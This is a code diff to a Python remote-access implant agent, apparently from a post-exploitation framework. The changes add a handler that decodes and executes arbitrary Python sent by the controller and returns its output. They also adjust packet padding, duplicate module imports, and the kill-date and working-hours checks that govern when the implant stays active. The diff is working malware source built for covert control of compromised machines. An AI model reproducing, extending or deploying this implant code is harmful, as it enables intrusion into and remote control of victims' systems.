@@ -42,9 +42,9 @@ missedCheckins = 0
 jobMessageBuffer = ''
 
 # killDate form -> "MO/DAY/YEAR"
-killDate = ''
+killDate = 'REPLACE_KILLDATE'
 # workingHours form -> "9:00-17:00"
-workingHours = ''
+workingHours = 'REPLACE_WORKINGHOURS'
 
 parts = profile.split('|')
 taskURIs = parts[0].split(',')
@@ -133,7 +133,10 @@ def build_response_packet(taskingID, packetData, resultID=0):
     resultID = struct.pack('=H', resultID)
     
     if packetData:
-        packetData = base64.b64encode(packetData.decode('utf-8').encode('utf-8',errors='ignore'))
+        packetData = base64.b64encode(packetData.decode('utf-8').encode('utf-8','ignore'))
+        if len(packetData) % 4:
+            packetData += '=' * (4 - len(packetData) % 4)
+            
         length = struct.pack('=L',len(packetData))
         return packetType + totalPacket + packetNum + resultID + length + packetData
     else:
@@ -247,8 +250,7 @@ def process_packet(packetType, data, resultID):
     elif packetType == 2:
         # agent exit
 
-        msg = "[!] Agent %s exiting" %(sessionID)
-        send_message(build_response_packet(2, msg, resultID))
+        send_message(build_response_packet(2, "", resultID))
         agent_exit()
 
     elif packetType == 40:
@@ -416,6 +418,21 @@ def process_packet(packetType, data, resultID):
         # TODO: implement job structure
         pass
 
+    elif packetType == 121:
+        #base64 decode the script and execute
+        script = base64.b64decode(data)
+        try:
+            buffer = StringIO()
+            sys.stdout = buffer
+            code_obj = compile(script, '<string>', 'exec')
+            exec code_obj in globals()
+            sys.stdout = sys.__stdout__
+            result = str(buffer.getvalue())
+            return build_response_packet(121, result, resultID)
+        except Exception as e:
+            errorData = str(buffer.getvalue())
+            return build_response_packet(0, "error executing specified Python data %s \nBuffer data recovered:\n%s" %(e, errorData), resultID)
+
     elif packetType == 122:
         #base64 decode and decompress the data
         try:
@@ -432,9 +449,12 @@ def process_packet(packetType, data, resultID):
 
         zdata = dec_data['data']
         zf = zipfile.ZipFile(io.BytesIO(zdata), "r")
-        moduleRepo[fileName] = zf
-        install_hook(fileName)
-        send_message(build_response_packet(122, "Successfully imported %s" % (fileName), resultID))
+        if fileName in moduleRepo.keys():
+            send_message(build_response_packet(122, "%s module already exists" % (fileName), resultID))
+        else:
+            moduleRepo[fileName] = zf
+            install_hook(fileName)
+            send_message(build_response_packet(122, "Successfully imported %s" % (fileName), resultID))
 
     elif packetType == 123:
         #view loaded modules
@@ -881,7 +901,7 @@ def get_file_part(filePath, offset=0, chunkSize=512000, base64=True):
 
 while(True):
     try:
-        if workingHours != '':
+        if workingHours != '' and 'WORKINGHOURS' not in workingHours:
             try:
                 start,end = workingHours.split('-')
                 now = datetime.datetime.now()
@@ -898,10 +918,14 @@ while(True):
 
         # check if we're past the killdate for this agent
         #   killDate form -> MO/DAY/YEAR
-        if killDate != "":
+        if killDate != "" and 'KILLDATE' not in killDate:
             now = datetime.datetime.now().date()
-            killDateTime = datetime.datetime.strptime(killDate, "%m/%d/%Y").date()
-            if now > killDateTime:
+            try:
+                killDateTime = datetime.datetime.strptime(killDate, "%m/%d/%Y").date()
+            except:
+                pass
+            
+            if now >= killDateTime:
                 msg = "[!] Agent %s exiting" %(sessionID)
                 send_message(build_response_packet(2, msg))
                 agent_exit()
